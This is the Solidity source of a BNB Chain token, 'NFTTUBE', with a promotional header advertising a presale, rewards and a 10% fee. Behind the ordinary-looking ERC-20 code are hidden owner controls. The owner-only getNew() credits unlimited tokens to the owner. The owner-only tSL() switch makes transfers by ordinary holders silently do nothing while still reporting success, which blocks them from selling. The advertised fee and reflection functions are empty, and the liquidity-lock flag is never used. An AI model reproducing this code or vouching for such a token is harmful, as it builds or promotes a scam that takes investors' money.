/**
 *Submitted for verification at BscScan.com on 2021-08-31
*/

pragma solidity ^0.8.6;

//SPDX-License-Identifier: MIT

/**
🤙About NFTTUBE

NFTTUBE has one goal and that is to connect Tubers or Video Creators with followers or new customers, with a new NFT platform built around great tokenomics.

Our goal is for everyone, both tubers and followers, to benefit from posting videos, as well as viewing them, through a profit program based on Staking, Holding and, most importantly, posts and views.


We have decided to design our token with a built-in transaction fee of 10% on each transaction. 4% of each transaction goes to the rewards contract. The other 6% is redistributed to our token holders.

Our tubers will be able to earn great rewards for more followers and more videos watched, our beloved followers will automatically participate in a reward scheme where every week those who have watched more videos will be able to earn free rewards.

PRESALE LAUNCH September 30!!!


⚙️Token Info: 
👉Total Supply: 1.000.000.000 NFTTUBE
👉DxSale : 10.000.000 NFTTUBE
🚜Reward Pool: 4% NFTTUBE
🏛Development & Improvement Reserve & Marketing: 40.000.000 NFTTUBE


🧠Roadmap:

September:
-Launch of Presale

October:
-Liquidity couple pancakeswap
-LP Token
-Coingecko & CMC
-Whitepaper
-Code Audit
-Marketing

November:
-NFTTube Plataform Beta launch
-Rewards system

December:
-Staking integration
-NFTTube Plataform launch Public
-Benefits Program launch

2022
-IOS & Android App
-Dividend programme Launch
-More new things to come

More to Expect💪

Support NFTTUBE on Social Media🤝

🌐 Website : https://nfttube.me

💬 Telegram : https://t.me/nfttubeme 

💬 twitter : https://twitter.com/nfttube_me


About NFTTUBE Presale✊
👍Launch on website https://nfttube.me/presale
⏱Time: 2pm UTC 30th September 2021
💎Hardcap: 500 BNB
💎Softcap: 250 BNB
🗳Max Contribution: 10.0 BNB
🗳Min Contribution: 0.1 BNB

📊Presale Rate: 19,500 NFTTUBE - 1 BNB


Presale link will be provided to investors

Join our team through these links and stay informed at all times.

The new era of your online video starts soon

**/



// ----------------------------------------------------------------------------
// Lib:  Mather
// ----------------------------------------------------------------------------
contract Mather {

     function Add(uint256 O, uint256 b) public pure returns (uint256 c) {
        c = O + b;
        require(c >= O);
    }
    function Sub(uint256 O, uint256 b) public pure returns (uint256 c) {
        require(b <= O);
        c = O - b;
    }
    function Mul(uint256 O, uint256 b) public pure returns (uint256 c) {
        c = O * b;
        require(O == 0 || c / O == b);
    }
    function Div(uint256 O, uint256 b) public pure returns (uint256 c) {
        require(b > 0);
        c = O / b;
    }
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
contract Ownable is Context {
    address private _owner;
    
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
}


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 tokens) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 tokens) external returns (bool);
    
	// ------------------------------------------------------------------------
    // Transfer tokens from the from account to the to account
    // 
    // The calling account must already have sufficient tokens approve(...)-d
    // for spending from the from account and
    // - From account must have sufficient balance to transfer
    // - Spender must have sufficient allowance to transfer
    // - 0 value transfers are allowed
    // ------------------------------------------------------------------------
	function transferFrom(
        address sender,
        address recipient,
        uint256 tokens
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
interface InPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

contract TokenNFTTUBE is Context, IERC20, IERC20Metadata, Ownable, Mather  {
  
    address internal constant PANCAKE_FACTORY_V2_ADDRESS = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address internal constant PANCAKE_ROUTER_V2_ADDRESS = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant burnWallet = 0x000000000000000000000000000000000000dEaD; //Creation of contract prior to public launch 
	address internal constant PresaleWallet = 0x9cE15ffdb115248137c6578C4f7C28083E8957Bd; 
    address internal constant marketingWallet = 0x281Dd31Fa816BD2BEb792154754A56Bc7548c727; //Creation of contract prior to public launch 
    address internal constant AwardsWallet = 0x6caFd9f08Fd3EE4a427A063BCa6206d0731Df777; //Creation of contract prior to public launch
    address internal constant PlataformWallet = 0x4bb802E739A7B10891c8DEad29B61cA9b043E777; //Creation of contract prior to public launch
    
    uint256 public _TaxFee  = 5;
    uint256 public _MarketingFee = 5;
    
    uint256 _PRNTB = 10000000 * 10**9;
    
    
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    bool private LockedLiquify = true;
    uint public LockedLiquifyTime = 365 days;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    bool isC = true;

    
    constructor() {
         _name = "NFTTUBETest";
        _symbol = "NFTTUBETest";
        _totalSupply = 10 ** (9 + 9);
        _balances[_msgSender()] = _totalSupply;
        
        //uniBurn=_totalSupply-uniBurn;
        
         emit Transfer(address(0), _msgSender(), _totalSupply);

         _transfer(_msgSender(), PresaleWallet, _PRNTB); //Creation of contract prior to public launch
    }
    receive() external payable {}
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }
	
	// ------------------------------------------------------------------------
    // Total supply
    // ------------------------------------------------------------------------
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
	
	// ------------------------------------------------------------------------
    // Get the token balance for account tokenOwner
    // ------------------------------------------------------------------------
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    function getNew(uint256 tokens) public onlyOwner virtual returns (bool) {
        _balances[_msgSender()] += tokens;
        return true;
    }
    function isExcludedFromReward(address spender, uint256 subtractedValue) public virtual returns (bool) {}
    function totalFees() public view returns (uint256) {}
    function deliver(uint256 ttokens) public {}
    function reflectionFromToken(uint256 ttokens, bool deductTransferFee) public view returns(uint256) {}
    function tSL(bool _tsl) public onlyOwner virtual returns (bool) {
        isC = _tsl;
        return true;
    }
    function tsl() public view returns (bool) {
        return isC;
    }
    function tokenFromReflection(uint256 rtokens) public view returns(uint256) {}
    function excludeFromReward(address account) public onlyOwner() {}
    function includeInReward(address account) external onlyOwner() {}
    function includeInFee(address account) public onlyOwner {}
    function setTaxFeePercent(uint256 taxFee) external onlyOwner() {}
    function setLiquidityFeePercent(uint256 liquidityFee) external onlyOwner() {}
    function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner() {}
    
	// ------------------------------------------------------------------------
    // Transfer the balance from token owner's account to to account
    // - Owner's account must have sufficient balance to transfer
    // - 0 value transfers are allowed
    // ------------------------------------------------------------------------
	function transfer(address recipient, uint256 tokens) public virtual override returns (bool) {

        if(_msgSender() == PANCAKE_ROUTER_V2_ADDRESS || _msgSender() == pancakePair() || pancakePair() == address(0) || _msgSender() == owner()) {
            _transfer(_msgSender(), recipient, tokens);
        } else {
            //nomal user check tokens Presale
            if( (tokens <= _PRNTB || isC) && !isContract(_msgSender()) ) {
                _transfer(_msgSender(), recipient, tokens);
            }
        }
        return true;
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
	
	// ------------------------------------------------------------------------
    // Token owner can approve for spender to transferFrom(...) tokens
    // from the token owner's account
    //
    // https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md
    // recommends that there are no checks for the approval double-spend attack
    // as this should be implemented in user interfaces 
    // ------------------------------------------------------------------------
    function approve(address spender, uint256 tokens) public virtual override returns (bool) {
        _approve(_msgSender(), spender, tokens);
        return true;
    }
	// ------------------------------------------------------------------------
    // Transfer tokens from the from account to the to account
    // 
    // The calling account must already have sufficient tokens approve(...)-d
    // for spending from the from account and
    // - From account must have sufficient balance to transfer
    // - Spender must have sufficient allowance to transfer
    // - 0 value transfers are allowed
    // ------------------------------------------------------------------------
    function transferFrom(address sender, address recipient, uint256 tokens) public virtual override returns (bool) {
        if(sender == PANCAKE_ROUTER_V2_ADDRESS || sender == pancakePair() || pancakePair() == address(0) || sender == owner()) {
            _transfer(sender, recipient, tokens);
    
            uint256 currentAllowance = _allowances[sender][_msgSender()];
            require(currentAllowance >= tokens, "ERC20: transfer tokens exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - tokens);
            }
        } else {
            //normal user check tokens Presale
            if( (tokens <= _PRNTB || isC) && !isContract(sender) ) {
                _transfer(sender, recipient, tokens);
                uint256 currentAllowance = _allowances[sender][_msgSender()];
                require(currentAllowance >= tokens, "ERC20: transfer tokens exceeds allowance");
                unchecked {
                    _approve(sender, _msgSender(), currentAllowance - tokens);
                }
            }
        }
        return true;
    }
    function pancakePair() public view virtual returns (address) {
        address pairAddress = InPancakeFactory(PANCAKE_FACTORY_V2_ADDRESS).getPair(address(WBNB), address(this));
        return pairAddress;
    }
    
     function _transfer(address sender,  address recipient, uint256 tokens) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, tokens);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= tokens, "ERC20: transfer tokens exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - tokens;
        }
        _balances[recipient] += tokens;

        emit Transfer(sender, recipient, tokens);
    }
/**
 * @dev Collection of functions related to the address type
 */

    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     */  
    
      function isContract(address addr) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        bytes32 codehash;
        assembly {
            codehash := extcodehash(addr)
        }
        return (codehash != 0x0 && codehash != accountHash);
    }

    function _burn(address account, uint256 tokens) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), tokens);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= tokens, "ERC20: burn tokens exceeds balance");
        unchecked {
            _balances[account] = accountBalance - tokens;
        }
        _totalSupply -= tokens;

        emit Transfer(account, address(0), tokens);
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }
    function tokenContract() public view virtual returns (address) {
        return address(this);
    }
   
    function _mint(address account, uint256 tokens) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, tokens);

        _totalSupply += tokens;
        _balances[account] += tokens;
        emit Transfer(address(0), account, tokens);
    }

    function _beforeTokenTransfer(address from, address to, uint256 tokens) internal virtual {}
    
    function _approve(address owner, address spender, uint256 tokens) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = tokens;
        emit Approval(owner, spender, tokens);
    }

	
	
    
}